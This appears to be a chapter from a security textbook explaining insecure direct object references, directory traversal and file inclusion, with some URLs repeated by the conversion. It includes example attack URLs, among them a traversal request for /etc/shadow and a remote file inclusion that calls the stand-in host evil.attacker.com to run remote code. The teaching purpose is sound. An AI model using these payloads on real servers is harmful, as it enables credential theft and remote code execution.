---
{
  "id": "chapter-234",
  "title": "Exploiting Authorization Vulnerabilities",
  "order": 234,
  "source": {
    "href": "c21.xhtml",
    "anchor": "head-2-370"
  },
  "est_tokens": 1728,
  "slug": "exploiting-authorization-vulnerabilities",
  "meta": {
    "nav_title": "Exploiting Authorization Vulnerabilities",
    "enriched_from": "start-heading",
    "kind": "chapter"
  }
}
---
## Exploiting Authorization Vulnerabilities

We've explored injection vulnerabilities that allow an attacker to send code to back-end systems and authentication vulnerabilities that allow an attacker to assume the identity of a legitimate user. Let's now take a look at some authorization vulnerabilities that allow an attacker to exceed the level of access that they are authorized.

# OWASP

The Open Web Application Security Project (OWASP) is a nonprofit security project focused on improving security for online or web-based applications. OWASP is not just an organization—it is also a large community that works together to freely share information, methodology, tools, and techniques related to better coding practices and more secure deployment architectures. For more information on OWASP and to participate in the community, visit owasp.org .

OWASP also maintains a top 10 list of the most critical web application security risks at https://owasp.org/www-project-top-ten and the top 10 proactive controls to protect against application security issues at https://owasp.org/www-project-proactive-controls/ .

Both of these documents would be a reasonable starting point for planning a security evaluation or penetration test of an organization's web services.

### Insecure Direct Object References

In some cases, web developers design an application to directly retrieve information from a database based on an argument provided by the user in either a query string or a POST request. For example, the following query string might be used to retrieve a document from a document management system (replacing [companyname] with the name of the particular organization, of course):

`[companyname]`

```

https://www.[companyname].com/getDocument.php?documentID=1842
```

`https://www.[companyname].com/getDocument.php?documentID=1842`

There is nothing wrong with this approach, as long as the application also implements other authorization mechanisms. The application is still responsible for ensuring that the user is properly authenticated and is authorized to access the requested document.

The reason for this is that an attacker can easily view this URL and then modify it to attempt to retrieve other documents, such as in these examples:

```

https://www.mycompany.com/getDocument.php?documentID=1841

https://www.mycompany.com/getDocument.php?documentID=1843

https://www.mycompany.com/getDocument.php?documentID=1844
```

`https://www.mycompany.com/getDocument.php?documentID=1841`

`https://www.mycompany.com/getDocument.php?documentID=1843`

`https://www.mycompany.com/getDocument.php?documentID=1844`

If the application does not perform authorization checks, the user may be permitted to view information that exceeds their authority. This situation is known as an insecure direct object reference .

# Canadian Teenager Arrested for Exploiting Insecure Direct Object Reference

In April 2018, Nova Scotia authorities charged a 19-year-old with “unauthorized use of a computer” when he discovered that the website used by the province for handling Freedom of Information requests had URLs that contained a simple integer corresponding to the request ID.

After noticing this, the teenager simply altered the ID from a URL that he received after filing his own request and viewed the requests made by other individuals. That's not exactly a sophisticated attack, and many cybersecurity professionals (your authors included) would not even consider it a hacking attempt. Eventually, the authorities recognized that the province IT team was at fault and dropped the charges against the teenager.

### Directory Traversal

Some web servers suffer from a security misconfiguration that allows users to navigate the directory structure and access files that should remain secure. These directory traversal attacks work when web servers allow the inclusion of operators that navigate directory paths and file system access controls don't properly restrict access to files stored elsewhere on the server.

For example, consider an Apache web server that stores web content in the directory path /var/www/html/ . That same server might store the shadow password file, which contains hashed user passwords, in the /etc directory as /etc/shadow . Both of these locations are linked through the same directory structure, as shown in Figure 21.5 .

`/var/www/html/`

`/etc`

`/etc/shadow`

FIGURE 21.5 Example web server directory structure

FIGURE 21.5 Example web server directory structure

If the Apache server uses /var/www/html/ as the root location for the website, this is the assumed path for all files unless otherwise specified. For example, if the site were www.mycompany.com , the URL www.mycompany.com/account.php would refer to the file /var/www/html/account.php stored on the server.

`/var/www/html/`

`www.mycompany.com`

`www.mycompany.com/account.php`

`/var/www/html/account.php`

In Linux operating systems, the .. operator in a file path refers to the directory one level higher than the current directory. For example, the path /var/www/html/../ refers to the directory that is one level higher than the html directory, or /var/www/ .

`..`

`/var/www/html/../`

`/var/www/`

Directory traversal attacks use this knowledge and attempt to navigate outside of the areas of the filesystem that are reserved for the web server. For example, a directory traversal attack might seek to access the shadow password file by entering this URL:

```

http://www.mycompany.com/../../../etc/shadow
```

`http://www.mycompany.com/../../../etc/shadow`

If the attack is successful, the web server will dutifully display the shadow password file in the attacker's browser, providing a starting point for a brute-force attack on the credentials. The attack URL uses the .. operator three times to navigate up through the directory hierarchy. If you refer back to Figure 21.5 and use the /var/www/html directory as your starting point, the first .. operator brings you to /var/www , the second brings you to /var , and the third brings you to the root directory, / . The remainder of the URL brings you down into the /etc/ directory and to the location of the /etc/shadow file.

`..`

`/var/www/html`

`..`

`/var/www`

`/var`

`/`

`/etc/`

`/etc/shadow`

### File Inclusion

File inclusion attacks take directory traversal to the next level. Instead of simply retrieving a file from the local operating system and displaying it to the attacker, file inclusion attacks actually execute the code contained within a file, allowing the attacker to fool the web server into executing targeted code.

File inclusion attacks come in two variants:

- Local file inclusion attacks seek to execute code stored in a file located elsewhere on the web server. They work in a manner very similar to a directory traversal attack. For example, an attacker might use the following URL to execute a file named attack.exe that is stored in the C:\www\uploads directory on a Windows server: http://www.mycompany.com/app.php?include=C:\\www\\uploads\\attack.exe

`attack.exe`

`C:\www\uploads`

`http://www.mycompany.com/app.php?include=C:\\www\\uploads\\attack.exe`

- Remote file inclusion attacks allow the attacker to go a step further and execute code that is stored on a remote server. These attacks are especially dangerous because the attacker can directly control the code being executed without having to first store a file on the local server. For example, an attacker might use this URL to execute an attack file stored on a remote server:

- http://www.mycompany.com/app.php?include=http://evil.attacker.com/attack.exe

```

http://www.mycompany.com/app.php?include=http://evil.attacker.com/attack.exe
```

`http://www.mycompany.com/app.php?include=http://evil.attacker.com/attack.exe`

When attackers discover a file inclusion vulnerability, they often exploit it to upload a web shell to the server. Web shells allow the attacker to execute commands on the server and view the results in the browser. This approach provides the attacker with access to the server over commonly used HTTP and HTTPS ports, making their traffic less vulnerable to detection by security tools. In addition, the attacker may even repair the initial vulnerability they used to gain access to the server to prevent its discovery by another attacker seeking to take control of the server or by a security team who then might be tipped off to the successful attack.
